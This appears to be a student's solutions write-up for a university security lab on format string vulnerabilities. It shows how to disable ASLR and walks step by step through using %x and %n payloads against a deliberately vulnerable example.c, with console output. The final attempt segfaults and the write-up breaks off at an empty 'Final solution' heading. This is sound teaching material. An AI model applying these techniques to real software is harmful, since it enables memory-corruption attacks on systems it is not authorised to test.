# Solutions TP7
> Author(s): Guillaume Everarts de Velp  
> Last update: 26-03-2020

**Progress**
 - [x] [7.1 Environment Configuration](#71-environment-configuration)
 - [ ] [7.2 Evading Stack Protection](#72-format-string)

## 7.1 Environment Configuration
> This is the same at last week, but repeated so you don't forget.
> 
> On most Linux systems and with most compilers there are protections built in to prevent various exploits. For today's tutorial > we may have to turn some of these off (and back on again later).
> 
> One is the randomisation of memory segments by the Linux kernel. We can see the current value with `sudo cat /proc/sys/kernel/randomize_va_space`
> This is "2" by default on Kali Linux (and most Linux systems). To turn this off for the rest of the sessions by setting the value to "0" we can run `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
> Afterwards, confirm we have turned off memory segment randomisation with `sudo cat /proc/sys/kernel/randomize_va_space`
> 
> Note that this will be changed later in the tutorial at different times.

## 7.2 Format String
> Here you will find a program "example.c" that has a format string vulnerability in the printf statement that you can use.
> 
> This is a program designed to help you explore how to abuse format string and pass in parameters. You can build the program with: `gcc -o example example.c` and then run it with format string arguments, for example: `./example "%x %x %x %x"` will print out some values on the stack.
> 
> Observe that there is a value called "test_value" that you MAY be able to modify.
> 
> NOTE: Due to memory layout and your architecture it MAY NOT be easy or possible to inject a format string (e.g. your address may require a \x00 which would break the formatting). For the rest of this section, you can also use format1.c or format2.c if these have better memory layout for you (e.g. you want to change values on the stack).
> 
> The goal now is to use a format string to change the value of either "test_val" in example.c, or "target" in format1.c or format2.c.
> 
> HINT: The format string component "%n" writes back from format string into an address. You can use this to change the value of one of the "arguments" to the function using your format string.

### Idea :bulb:
The main idea will be to use `%n` as an argument passed to a vulnerable *printf* to write a value in memory.  To do so, we can pass at the beginning of the string the address we are willing to write on, then insert as many "parameter sollicitation" as we need to reach the begin of the string in memory (with `%x` for example), and finally add `%n`, which will count the number of characters printed until now and write it in the address given by then next argument on the stack, which would be in our case the address at the beginning of the string.

### Step by step :walking:
**1. `example.c` Address to write on** Here things seems quite straithforward.  By playing a little bit with the executable, we can see that the pointer of the value we would like to overwrite is given (and shouldn't change from one execution to the other).
```console
admin@kali:~/SecurityClass/Tutorial-07$ ./example test
the right way to do things:
test
the wrong way to do things:
test
test val is -72 at 0x00404028 and contains 0xffffffb8
```

**2. `example.c` Malicious string location** The goal will be to go up the stack until we reach the begging of our string, where we can pass the address to print on.  We then want to know how many steps are we from the beginning of this string.  To do so, we can simply pass a string starting with some well known characters, then go up as far as we can and see where we started seeing those characters.
```console
the right way to do things:
AAAA %x %x %x %x %x %x %x %x %x %x
the wrong way to do things:
AAAA bffff586 bfffef9c 4011e3 41414141 20782520 25207825 78252078 20782520 25207825 78252078
test val is -72 at 0x00404028 and contains 0xffffffb8
```
We can see that we reach the beginning of the string "41414141" with the fourth `%x`, meaning than we will need to add three of them before `%n` in order to have `%n` to read the beginning of the string as the pointer to write to.

**3. `example.c` Putting it all together** All we need know is put the address at the beginning of the string, add three `%x` and our magical `%n` and we should write then length of the string to *test_val*.
```console
admin@kali:~/SecurityClass/Tutorial-07$ ./example "`perl -e 'print "\x00\x40\x40\x28" . " %x"x3 . " %n"'`"
bash: warning: command substitution: ignored null byte in input
the right way to do things:
@@( %x %x %x %n
the wrong way to do things:
Segmentation fault
```
But of course it doesn't work, we can see that bash warns us that the null byte is ignored, meaning that the pointer we pass to `%n` won't be the right one, which causes a segmentation fault.



### Final solution :running:
